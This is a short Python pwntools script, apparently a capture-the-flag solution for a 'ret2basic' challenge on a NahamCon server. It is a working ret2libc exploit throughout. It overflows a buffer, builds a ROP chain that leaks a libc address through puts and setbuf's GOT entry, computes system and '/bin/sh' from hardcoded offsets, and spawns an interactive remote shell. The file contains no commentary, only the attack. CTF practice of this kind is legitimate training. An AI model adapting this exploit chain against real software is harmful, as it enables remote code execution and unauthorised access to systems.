#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2basic")

context.binary = exe


def conn():
        return process([exe.path])

#r = conn()
r = remote("challenge.nahamcon.com", 30413)

def main():
    r.recvuntil("Can you overflow this?: ")
    offset = 0x78
    pop_rdi = 0x00000000004013c3
    
    payload = b"M"*offset
    payload += p64(pop_rdi)
    payload += p64(exe.got['setbuf'])
    payload += p64(exe.plt["puts"])
    payload += p64(exe.sym['main'])
    r.sendline(payload)
    
    leak = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("Leak @ 0x%x", leak)

    libc_base = leak - 0x08ec50
    system = libc_base + 0x055410
    binsh = libc_base + 0x1b75aa
    
    r.recvuntil("Can you overflow this?: ")

    payload = b"M"*offset
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(pop_rdi+1)
    payload += p64(system)
    
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
